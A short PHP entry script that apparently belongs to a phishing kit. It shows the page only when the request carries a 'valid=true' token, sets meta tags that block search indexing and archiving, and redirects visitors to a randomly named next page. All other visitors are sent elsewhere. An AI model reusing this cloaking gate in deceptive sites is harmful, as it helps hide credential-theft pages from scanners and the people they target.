<?php

	$page = 'index';
	/* Require Files */
    require_once './init.php';

    /* Chak If User Coming From Valid URL */
    if($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['valid']) && $_GET['valid'] === 'true'):
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />
    <link rel="stylesheet" href="<?php echo $css1; ?>" type="text/css">
    <link rel="stylesheet" href="<?php echo $css2; ?>" type="text/css">
    <link rel="stylesheet" href="<?php echo $css3; ?>" type="text/css">
    <link rel="stylesheet" href="<?php echo $css4; ?>" type="text/css">
    <title></title>
  </head>
	<body>
		<?php die(rediret('./a6635011.php?'.$id)); // We're done here ?>
	</body>
</html>
<?php
	else:
		die(rediret($index)); // We're done here
    endif;
    ob_end_flush();
?>
